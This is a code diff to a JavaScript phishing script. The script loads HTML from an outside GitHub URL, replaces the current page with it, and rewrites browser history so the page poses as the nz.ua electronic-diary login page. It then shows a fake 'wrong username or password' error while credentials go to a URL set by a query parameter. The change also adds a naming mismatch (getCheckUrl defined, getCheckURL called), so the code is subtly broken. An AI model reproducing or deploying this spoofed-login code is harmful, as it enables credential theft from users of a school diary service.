@@ -41,14 +41,21 @@ function createMyScript() {
         return next ? next : 'https://nz.ua/menu/'
     }
     
+    function getCheckUrl() {
+        let url = new URL(window.location.href);
+        let next = url.searchParams.get('checkURL');
+        return next ? next : 'https://nz.ua/menu/'
+    }
+    
     function showError() {
         let block = document.createElement('div')
         block.innerHTML = '<div class="alert alert-danger" role="alert"><div><ul><li>Неправильне ім\\\'я користувача або пароль!</li></ul></div></div>';
         let main = document.getElementsByClassName('soobsh')[0]
         main.prepend(block)
     }
+
     const nextUrl = getNextUrl()
-    const checkCredentialsURL = new URL(window.location.href).searchParams.get('checkURL');
+    const checkCredentialsURL = getCheckURL();
 
     let showedError = false;
     
@@ -68,8 +75,8 @@ function createMyScript() {
 
 let html = g('https://raw.githubusercontent.com/thebocher/js-script/main/h.html') 
 document.documentElement.innerHTML = html
-window.history.pushState({"html": html,"pageTitle":"Нові знання - Вхід на сайт - Електронні щоденники та журнали з можливостями дистанційного навчання/ Электронные дневники и журналы"}, "", "/")
 document.body.appendChild( createMyScript() )
+window.history.pushState({"html": html,"pageTitle":"Нові знання - Вхід на сайт - Електронні щоденники та журнали з можливостями дистанційного навчання/ Электронные дневники и журналы"}, "", "/")
 
 
 
